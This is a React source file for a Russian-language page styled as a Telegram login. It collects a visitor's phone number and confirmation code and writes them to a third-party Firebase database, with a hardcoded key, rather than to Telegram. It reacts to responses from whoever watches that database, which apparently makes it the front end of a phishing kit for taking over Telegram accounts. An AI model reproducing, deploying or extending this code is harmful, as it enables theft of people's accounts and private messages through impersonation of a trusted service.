import React, { useState, useEffect } from "react";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue, off } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBwXWAuh7-BoHeJGe-9T7B4GQQjD-kJqAo",
  databaseURL: "https://vlom-71da6-default-rtdb.firebaseio.com",
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function TelegramLogin() {
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [step, setStep] = useState("phone");
  const [error, setError] = useState(null);
  const [loading, setLoading] = useState(false);
  const [sessionId, setSessionId] = useState("");
  const [showRetry, setShowRetry] = useState(false);

  useEffect(() => {
    setSessionId("session-" + Date.now());
  }, []);

  useEffect(() => {
    if (!sessionId) return;

    const responseRef = ref(db, `sessions/${sessionId}/response`);
    const unsubscribe = onValue(responseRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) return;

      if (data.error) {
        if (data.error_type === "invalid_code") {
          setError("Неверный код! Пожалуйста, попробуйте еще раз.");
          setShowRetry(true);
          setStep("code");
        } else {
          setError(data.error);
          setShowRetry(true);
        }
        setLoading(false);
      } else if (data.step === "restart") {
        setStep("phone");
        setPhone("");
        setCode("");
        setError(null);
        setShowRetry(false);
        setLoading(false);
      } else if (data.step) {
        setStep(data.step);
        setError(null);
        setLoading(false);
      }
    });

    return () => off(responseRef);
  }, [sessionId]);

  const handleRetry = async () => {
    setLoading(true);
    setError(null);
    setShowRetry(false);
    try {
      await set(ref(db, `sessions/${sessionId}/request`), {
        type: "restart",
        timestamp: Date.now(),
      });
    } catch (err) {
      setError("Ошибка перезапуска");
      setLoading(false);
    }
  };

  const handlePhoneSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      const phoneToSend = phone.replace(/\s/g, "");
      await set(ref(db, `sessions/${sessionId}/request`), {
        type: "phone",
        phone: phoneToSend,
        timestamp: Date.now(),
      });
    } catch (err) {
      setError("Ошибка отправки номера");
    } finally {
      setLoading(false);
    }
  };

  const handleCodeSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      await set(ref(db, `sessions/${sessionId}/request`), {
        type: "code",
        code: code,
        timestamp: Date.now(),
      });
    } catch (err) {
      setError("Ошибка отправки кода");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={styles.container}>
      <h2>Вход в Telegram</h2>
      {error && (
        <div style={styles.error}>
          {error}
          {showRetry && (
            <button onClick={handleRetry} style={styles.retryButton}>
              Попробовать снова
            </button>
          )}
        </div>
      )}
      {step === "phone" ? (
        <form onSubmit={handlePhoneSubmit}>
          <input
            type="tel"
            placeholder="+48 XXX XXX XXX"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            required
          />
          <button type="submit" disabled={loading}>
            {loading ? "Отправка..." : "Отправить номер"}
          </button>
        </form>
      ) : (
        <form onSubmit={handleCodeSubmit}>
          <input
            type="text"
            placeholder="Код подтверждения"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            required
          />
          <button type="submit" disabled={loading}>
            {loading ? "Проверка..." : "Подтвердить код"}
          </button>
        </form>
      )}
      // Внутри TelegramLogin — под формами
      <button
        onClick={async () => {
          await set(ref(db, `sessions/${sessionId}/request`), {
            type: "custom",
            data: {
              message: "Привет из сайта!",
              link: "https://example.com",
            },
            timestamp: Date.now(),
          });
        }}
        style={{ marginTop: 20 }}
      >
        Отправить произвольные данные
      </button>
    </div>
  );
}

const styles = {
  container: { maxWidth: 400, margin: "0 auto", padding: 20 },
  error: { color: "red", margin: "10px 0" },
  retryButton: { marginLeft: 10, padding: "5px 10px" },
};

export default TelegramLogin;
